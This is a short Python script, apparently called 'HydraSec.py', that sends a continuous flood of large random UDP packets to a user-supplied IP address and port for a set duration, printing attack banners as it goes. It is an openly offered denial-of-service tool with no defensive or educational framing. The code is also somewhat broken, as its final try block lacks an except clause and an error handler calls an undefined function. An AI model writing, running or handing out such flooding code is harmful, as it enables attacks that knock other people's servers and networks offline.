import os, sys, time, threading, socket, random

def clear():
	os.system('cls' if os.name=='nt' else 'clear')

def running(s):
	try:
		for c in s + '\n':
        	    sys.stdout.write(c)
	            sys.stdout.flush()
	            time.sleep(0.001)
	except (KeyboardInterrupt,EOFError):
		run('Error!!')

def usage():
    running("\033[91m[ < ] How To Usage??")
    running("\033[91m[ > ] Usage : python HydraSec.py [IP] [PORT] [TIME]")

def attack(ip, port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    size = random._urandom(20000)
    timeout =  time.time() + duration
    while True:
        if time.time() > timeout:
            break
        else:
            pass
        print("\033[94m -  HYDRA SEC AND BIMZZX ATTACKED TO IP \033[91m{}\033[94m ON PORT \033[91m{}".format(ip, port))
        client.sendto(size, (ip, port))
    print("\033[94mAttack Finished.")

def main():
    if len(sys.argv) != 4:
        usage()
    else:
      attack(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    try:
        main()
